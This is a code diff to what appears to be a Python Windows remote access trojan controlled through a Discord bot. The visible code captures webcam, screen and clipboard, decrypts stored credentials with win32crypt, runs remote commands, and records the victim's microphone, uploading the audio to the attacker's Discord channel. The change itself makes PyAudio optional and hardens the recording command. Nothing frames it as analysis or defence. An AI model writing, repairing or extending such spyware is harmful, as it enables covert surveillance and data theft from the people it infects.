@@ -23,8 +23,6 @@ import requests
 import winreg
 import base64
 import atexit
-import pyaudio
-import wave
 import win32clipboard
 import cv2
 import shutil
@@ -35,6 +33,16 @@ from Crypto.Cipher import AES
 import win32crypt
 from PIL import ImageGrab
 import win32com.client
+
+# PyAudio - optional, handle gracefully if missing
+try:
+    import pyaudio
+    import wave
+    AUDIO_AVAILABLE = True
+except ImportError:
+    AUDIO_AVAILABLE = False
+    pyaudio = None
+    wave = None
 
 if platform.system() != "Windows":
     sys.exit(0)
@@ -256,6 +264,8 @@ def capture_webcam(cam_id=0):
     return None
 
 def record_mic(duration=10):
+    if not AUDIO_AVAILABLE:
+        return None
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
     CHANNELS = 1
@@ -668,14 +678,20 @@ async def run_cmd(ctx, *, command: str):
 @bot.command(name='mic')
 @is_authorized()
 async def mic_record(ctx, duration: int = 10):
+    if not AUDIO_AVAILABLE:
+        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
+        return
     try:
         if duration > 60:
             duration = 60
         await send_embed(ctx, "Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
         path = record_mic(duration)
-        with open(path, 'rb') as f:
-            await ctx.send(file=discord.File(f))
-        os.remove(path)
+        if path and os.path.exists(path):
+            with open(path, 'rb') as f:
+                await ctx.send(file=discord.File(f))
+            os.remove(path)
+        else:
+            await send_embed(ctx, "Error", "Failed to record microphone", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
